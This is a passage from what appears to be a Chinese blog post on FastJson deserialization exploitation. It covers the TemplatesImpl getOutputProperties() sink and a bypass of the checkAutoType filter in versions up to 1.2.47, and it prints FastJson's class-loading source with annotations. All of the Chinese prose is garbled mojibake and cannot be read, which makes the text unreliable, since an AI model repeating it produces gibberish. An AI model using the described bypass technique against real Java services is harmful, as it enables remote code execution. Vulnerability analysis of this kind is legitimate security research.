ä¹æ²¡æœ‰å¼€æ”¾è€…ä¼šè¿™ä¹ˆåšæ‰€ä»¥å®æˆ˜ä»·å€¼ä¸é«˜ã€‚</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥ï¼Œæ¥ç®€å•åˆ†æä¸€ä¸‹ã€‚</p><p>ç›¸ä¿¡ç†Ÿæ‚‰ccé“¾çš„å¸ˆå‚…åº”è¯¥éƒ½çŸ¥é“,TemplatesImplè¿™ä¸ªäº†ï¼Œè¿™ä¸ªç±»æ˜¯CC3ä¸­æœ€ååŠ è½½å­—èŠ‚ç è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ç±»ã€‚(å…·ä½“å‘½ä»¤æ‰§è¡Œçš„åŸç†æˆ‘å°±ä¸å±•å¼€è¯´äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…³äºccé“¾çš„åˆ†æ)</p><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="" title="alt text"><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class="" title="alt text"><p>åœ¨TemplatesImplä¸‹å¯ä»¥ç›´æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•æœ‰å¦‚ä¸Šçš„<code>getOutputProperties()</code>å’Œ<code>getTransletInstance()</code>è¿™ä¸¤ä¸ªç±»éƒ½ä¼šè§¦å‘ç±»çš„å®ä¾‹åŒ–ä»è€Œå‘½ä»¤æ‰§è¡Œã€‚ä½†<br>æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç°<code>getTransletInstance()</code>ä¸ºç§æœ‰ç±»ï¼Œè€Œç§æœ‰çš„getæˆ‘ä»¬æ— æ³•é€šè¿‡fastjsonæ¥è°ƒç”¨</p><p>getOutputProperties()æ˜¯å…±æœ‰ç±»ä¸”å…¶å†…éƒ¨è°ƒç”¨äº†newTransformerã€‚é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚<br>å†ç»™ä¸€äº›å¿…é¡»çš„å±æ€§èµ‹å€¼å°±å¯ä»¥æ„é€ å‡ºpayloadäº†</p><h2 id="lt-1-2-47bypass"><a href="#lt-1-2-47bypass" class="headerlink" title="&lt;=1.2.47bypass"></a>&lt;=1.2.47bypass</h2><p>å†FastJsonçš„1.2.25ç‰ˆæœ¬åå°±å¯¹å…¶è¿›è¡Œäº†ä¿®å¤ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯1.2.47çš„æºç ã€‚<br>æˆ‘ä»¬å…ˆå°è¯•æ‹¿ä¹‹å‰çš„payloadè¿›è¡Œè¿è¡Œ<br>ä¼šå‘ç°æŠ›å‡ºäº†å¼‚å¸¸<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/52.png" class="" title="alt text"><br>æ‰“å¼€æŠ¥é”™çš„ä½ç½®ä¼šå‘ç°æ˜¯checkAutoTypeæŠ›å‡ºçš„å¼‚å¸¸ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/53.png" class="" title="alt text"><br>åœ¨å¾€ä¸Šçœ‹å°±ä¼šå‘ç°æ˜¯åœ¨åŠ è½½ç±»æ˜¯ä½¿ç”¨äº†checkAutoTypeæ¥è¿›è¡Œè¿‡æ»¤<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/51.png" class="" title="alt text"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="comment">// é‡è½½æ–¹æ³•ï¼šæä¾›é»˜è®¤çš„ JSON è§£æç‰¹æ€§ features å‚æ•°ï¼Œè°ƒç”¨å¦ä¸€ä¸ª checkAutoType æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> checkAutoType(typeName, expectClass, JSON.DEFAULT_PARSER_FEATURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ typeName ä¸º nullï¼Œè¿”å› nullï¼Œè¡¨ç¤ºæ— æ³•å¤„ç†çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ typeName çš„é•¿åº¦ä¸ç¬¦åˆè¦æ±‚ï¼ˆè¿‡é•¿æˆ–è¿‡çŸ­ï¼‰ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†ç±»åä¸­çš„ &#x27;$&#x27; æ›¿æ¢ä¸º &#x27;.&#x27;ï¼Œå¤„ç†å†…éƒ¨ç±»</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FNV-1a å“ˆå¸Œç®—æ³•çš„å¸¸é‡å®šä¹‰ï¼Œç”¨äºè®¡ç®—å­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®— className ç¬¬ä¸€ä¸ªå­—ç¬¦çš„å“ˆå¸Œå€¼ h1</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ h1 çš„å€¼ç­‰äº 0xaf64164c86024f1aLï¼Œè¡¨ç¤ºå¯èƒ½æ˜¯å±é™©ç±»å‹ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æœ€åä¸€ä¸ªå­—ç¬¦çš„å“ˆå¸Œå€¼ï¼Œå¦‚æœåŒ¹é…å±é™©ç±»å‹ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—å‰ä¸‰ä¸ªå­—ç¬¦çš„å“ˆå¸Œå€¼ h3</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">            * PRIME;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœæ”¯æŒ autoType æˆ– expectClass ä¸ä¸º nullï¼Œåˆ™ç»§ç»­è¿›è¡Œå“ˆå¸ŒåŒ¹é…</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="comment">// éå†ç±»åä»ç¬¬ 4 ä¸ªå­—ç¬¦å¼€å§‹çš„å­—ç¬¦ï¼Œç»§ç»­è®¡ç®—å“ˆå¸Œå€¼</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            hash ^= className.charAt(i);</span><br><span class="line">            hash *= PRIME;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// å¦‚æœè®¡ç®—çš„å“ˆå¸Œå€¼åœ¨ acceptHashCodes ä¸­ï¼Œè¡¨ç¤ºå…è®¸åŠ è½½è¯¥ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz; <span class="comment">// è¿”å›åŠ è½½çš„ç±»</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å¦‚æœå“ˆå¸Œå€¼åœ¨ denyHashCodes ä¸­ï¼Œè¡¨ç¤ºä¸å…è®¸åŠ è½½è¯¥ç±»ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ clazz ä»ç„¶ä¸ºç©ºï¼Œå°è¯•ä»æ˜ å°„ä¸­è·å–ç±»</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœä»æ˜ å°„ä¸­è·å–å¤±è´¥ï¼Œå°è¯•é€šè¿‡ååºåˆ—åŒ–å™¨åŠ è½½ç±»</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ clazz å·²æˆåŠŸåŠ è½½ï¼Œè¿›è¡ŒæœŸæœ›ç±»å‹éªŒè¯</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœ expectClass ä¸ä¸º nullï¼Œä¸”åŠ è½½çš„ç±»ä¸æ˜¯ HashMapï¼Œä¸”ç±»å‹ä¸åŒ¹é…ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz; <span class="comment">// è¿”å›æˆåŠŸåŠ è½½çš„ç±»</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœä¸æ”¯æŒ autoTypeï¼Œå†æ¬¡è¿›è¡Œå“ˆå¸Œå€¼æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(i);</span><br><span class="line">            hash ^= c;</span><br><span class="line">            hash *= PRIME;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœå“ˆå¸Œå€¼åŒ¹é… denyHashCodesï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœå“ˆå¸Œå€¼åŒ¹é… acceptHashCodesï¼Œå°è¯•åŠ è½½ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// éªŒè¯åŠ è½½çš„ç±»ä¸æœŸæœ›ç±»å‹æ˜¯å¦åŒ¹é…ï¼Œè‹¥ä¸åŒ¹é…æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz; <span class="comment">// è¿”å›åŠ è½½çš„ç±»</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ clazz ä»ç„¶ä¸ºç©ºï¼Œå°è¯•åŠ è½½ç±»</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†æ¬¡æ£€æŸ¥ clazz æ˜¯å¦æˆåŠŸåŠ è½½</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœç±»å¸¦æœ‰ JSONType æ³¨è§£ï¼Œç›´æ¥è¿”å›</span></span><br><span class="line">        <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz, JSONType.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœç±»æ˜¯ ClassLoader æˆ– DataSource çš„å­ç±»ï¼Œè®¤ä¸ºæ˜¯å±é™©ç±»ï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¦‚æœ expectClass ä¸ä¸º nullï¼Œæ£€æŸ¥ç±»å‹æ˜¯å¦åŒ¹é…</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz; <span class="comment">// è¿”å›åŠ è½½çš„ç±»</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ£€æŸ¥ç±»çš„ä¿¡æ¯ï¼Œè‹¥æœ‰æ„é€ å‡½æ•°ä¸”æ”¯æŒ autoTypeï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">        <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">        <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®— autoType æ”¯æŒçš„ç‰¹æ€§</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Feature.SupportAutoType.mask;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeSupport</span><br><span class="line">            || (features &amp; mask) != <span class="number">0</span></span><br><span class="line">            || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœä¸æ”¯æŒ autoTypeï¼ŒæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz; <span class="comment">// è¿”å›æœ€ç»ˆåŠ è½½çš„ç±»</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clearDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// æ¸…ç©ºå½“å‰çš„ååºåˆ—åŒ–å™¨ç¼“å­˜</span></span><br><span class="line">    <span class="built_in">this</span>.deserializers.clear();</span><br><span class="line">    <span class="comment">// é‡æ–°åˆå§‹åŒ–ååºåˆ—åŒ–å™¨</span></span><br><span class="line">    <span class="built_in">this</span>.initDeserializers();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>å› ä¸ºæˆ‘ä»¬çš„autoTypeSupportä¸ºfalseä¸”expectClassé»˜è®¤ä¼ å…¥ä¸ºnullè¿™å°±å¯¼è‡´äº†é™¤äº†ä»ç¼“å­˜æ¥åŠ è½½ç±»ä¹‹å¤–ï¼Œæ ¹æœ¬æ— æ³•è¿›å…¥å…¶ä»–ç±»åŠ è½½çš„ifè¯­å¥</p><p>é‚£ä¹ˆæˆ‘ä»¬æƒ³è¦åŠ è½½è¿™ä¸ªç±»å°±åªèƒ½é€šè¿‡å¦‚ä¸‹ä»£ç æ¥ä»ç¼“å­˜ä¸­åŠ è½½äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ­¥å…¥</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆæˆ‘ä»¬æƒ³ä»ç¼“å­˜ä¸­åŠ è½½å°±è¦å°è¯•å°†ç±»å†™å…¥é“mappingsä¸­<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/55.png" class="" title="alt text"><br>æˆ‘ä»¬å…¨å±€æŸ¥æ‰¾mappingsçš„ç”¨æ³•å¯ä»¥æ‰¾åˆ°ä¸å°‘mappings.putï¼Œä½†å¤§éƒ¨åˆ†éƒ½æ˜¯å†™æ­»çš„ï¼Œåªæœ‰åœ¨TypeUtils.LoadClassçš„æˆ‘ä»¬æ‰èƒ½æ§åˆ¶å™¨å‚æ•°<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    